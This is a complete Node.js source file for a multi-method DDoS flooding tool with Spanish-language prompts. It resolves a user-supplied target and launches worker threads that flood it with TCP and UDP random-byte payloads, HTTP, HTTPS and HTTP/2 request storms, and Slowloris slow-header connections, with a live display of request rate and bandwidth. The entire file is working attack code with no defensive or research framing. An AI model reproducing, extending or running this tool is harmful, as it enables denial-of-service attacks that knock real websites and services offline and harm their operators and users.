#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes } = require('crypto');
const url = require('url');
const dns = require('dns/promises');
const os = require('os');

class DDoSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, fail: 0, bandwidth: 0 };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'HTTP2', 'SLOWLORIS'];
    }

    async start() {
        const targetInput = await this.ask(chalk.greenBright('Objetivo (URL/IP): '));
        const { hostname, port } = await this.parseTarget(targetInput);
        const threads = await this.askNumber(chalk.greenBright('Hilos (100-5000): '), 100, 5000);
        const duration = await this.askNumber(chalk.greenBright('Duración (segundos): '), 10, 3600);

        this.startTime = performance.now();
        this.launchWorkers(hostname, port, threads);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    async parseTarget(input) {
        try {
            if (net.isIP(input)) {
                return { hostname: input, port: 80 };
            }
            if (!input.includes('://')) input = 'http://' + input;
            const parsedUrl = new url.URL(input);
            const dnsResolved = await dns.lookup(parsedUrl.hostname);

            return {
                hostname: dnsResolved.address,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80)
            };
        } catch {
            console.error(chalk.red('\nError: Objetivo inválido'));
            console.log(chalk.yellow('Ejemplos válidos:'));
            console.log(chalk.yellow('- http://example.com'));
            console.log(chalk.yellow('- 192.168.1.1'));
            console.log(chalk.yellow('- google.com:8080\n'));
            process.exit(1);
        }
    }

    launchWorkers(host, port, threads) {
        const cores = Math.min(os.cpus().length, 32);
        const payloads = this.generatePayloads(host);

        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    host,
                    port,
                    payloads,
                    methods: this.methods,
                    intensity: Math.ceil(threads / cores) * 10
                }
            });
            worker.on('message', msg => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    generatePayloads(host) {
        const makePayload = size => randomBytes(size);
        return {
            tcp: makePayload(65535),
            udp: makePayload(65507),
            http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${host}\r\nConnection: Keep-Alive\r\n\r\n`
        };
    }

    updateStats({ total, success, fail, bandwidth }) {
        this.stats.total += total;
        this.stats.success += success;
        this.stats.fail += fail;
        this.stats.bandwidth += bandwidth;
    }

    showStats() {
        if (!this.startTime) return;
        const elapsed = (performance.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed || 0).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);

        process.stdout.write(
            chalk`\r{cyan [${elapsed.toFixed(1)}s]} ` +
            chalk`{white Peticiones:} {cyan ${this.stats.total}} ` +
            chalk`{green Éxito:} {cyan ${this.stats.success}} ` +
            chalk`{red Fallo:} {cyan ${this.stats.fail}} ` +
            chalk`{yellow RPS:} {cyan ${rps}} ` +
            chalk`{magenta BW:} {cyan ${bw}GB}`
        );

        setTimeout(() => this.showStats(), 250);
    }

    async ask(question) {
        return new Promise(resolve => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            rl.question(question, answer => {
                rl.close();
                resolve(answer);
            });
        });
    }

    async askNumber(question, min, max) {
        let num;
        do {
            num = parseInt(await this.ask(question)) || min;
        } while (num < min || num > max);
        return num;
    }

    stop() {
        this.workers.forEach(w => w.terminate());
        console.log(chalk.red('\n\nAtaque detenido'));
        process.exit();
    }
}

if (isMainThread) {
    new DDoSAttack().start();
} else {
    const { host, port, payloads, methods, intensity } = workerData;
    const activeConnections = new Set();

    const attackMethods = {
        TCP: () => {
            const socket = net.connect(port, host, () => {
                for (let i = 0; i < 20; i++) socket.write(payloads.tcp);
                report('success', payloads.tcp.length * 20);
            });
            socket.on('error', () => report('fail', 0));
        },

        UDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.udp, port, host, err => {
                err ? report('fail', 0) : report('success', payloads.udp.length);
                socket.close();
            });
        },

        HTTP: () => {
            for (let i = 0; i < 10; i++) {
                const req = http.request({
                    hostname: host,
                    port: port,
                    method: 'GET',
                    path: `/${randomBytes(8).toString('hex')}`,
                    headers: { 'Connection': 'Keep-Alive' }
                }, res => res.resume());
                req.on('error', () => report('fail', 0));
                req.end();
                report('success', 0);
            }
        },

        HTTPS: () => {
            for (let i = 0; i < 10; i++) {
                const req = https.request({
                    hostname: host,
                    port: port,
                    rejectUnauthorized: false,
                    method: 'GET',
                    path: `/${randomBytes(8).toString('hex')}`,
                    headers: { 'Connection': 'Keep-Alive' }
                }, res => res.resume());
                req.on('error', () => report('fail', 0));
                req.end();
                report('success', 0);
            }
        },

        HTTP2: () => {
            const client = http2.connect(`https://${host}:${port}`, { rejectUnauthorized: false });
            for (let i = 0; i < 5; i++) {
                const req = client.request({ ':path': `/${randomBytes(8).toString('hex')}` });
                req.on('data', () => {});
                req.on('end', () => {});
                req.end();
            }
            report('success', 0);
            client.on('error', () => report('fail', 0));
        },

        SLOWLORIS: () => {
            const socket = net.connect(port, host);
            socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\n`);
            activeConnections.add(socket);
            const interval = setInterval(() => {
                try {
                    socket.write(`X-a: ${randomBytes(16).toString('hex')}\r\n`);
                } catch {
                    clearInterval(interval);
                    activeConnections.delete(socket);
                }
            }, 4000);
            socket.on('error', () => {
                clearInterval(interval);
                activeConnections.delete(socket);
            });
        }
    };

    function report(state, bytes) {
        parentPort.postMessage({
            total: 1,
            success: state === 'success' ? 1 : 0,
            fail: state === 'fail' ? 1 : 0,
            bandwidth: bytes
        });
    }

    setInterval(() => {
        for (let i = 0; i < intensity; i++) {
            methods.forEach(method => {
                try {
                    attackMethods[method]();
                } catch {
                    report('fail', 0);
                }
            });
        }
    }, 20);
}